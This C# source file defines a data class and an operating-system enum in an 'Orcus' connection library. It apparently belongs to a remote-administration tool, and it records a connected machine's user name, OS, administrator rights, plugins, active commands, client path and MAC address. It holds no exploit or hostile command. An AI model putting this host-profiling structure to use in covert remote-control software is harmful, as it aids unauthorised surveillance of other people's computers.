// ReSharper disable InconsistentNaming

using System;
using System.Collections.Generic;
using System.ComponentModel;
using Orcus.Shared.Client;

namespace Orcus.Shared.Connection
{
    [Serializable]
    public class BasicComputerInformation
    {
        public string UserName { get; set; }
        public string OperatingSystemName { get; set; }
        public OSType OperatingSystemType { get; set; }
        public string Language { get; set; }
        public bool IsAdministrator { get; set; }
        public bool IsServiceRunning { get; set; }
        public List<PluginInfo> Plugins { get; set; }
        public List<LoadablePlugin> LoadablePlugins { get; set; }
        public List<int> ActiveCommands { get; set; }
        public ClientConfig ClientConfig { get; set; }
        public int ClientVersion { get; set; }
        public string ClientPath { get; set; }
        public int ApiVersion { get; set; }
        public double FrameworkVersion { get; set; }
        public byte[] MacAddress { get; set; }
    }

    [Serializable]
    public enum OSType : byte
    {
        [Description("Unknown")]
        Unknown,
        [Description("Windows XP")]
        WindowsXp,
        [Description("Windows Vista")]
        WindowsVista,
        [Description("Windows 7")]
        Windows7,
        [Description("Windows 8")]
        Windows8,
        [Description("Windows 10")]
        Windows10
    }
}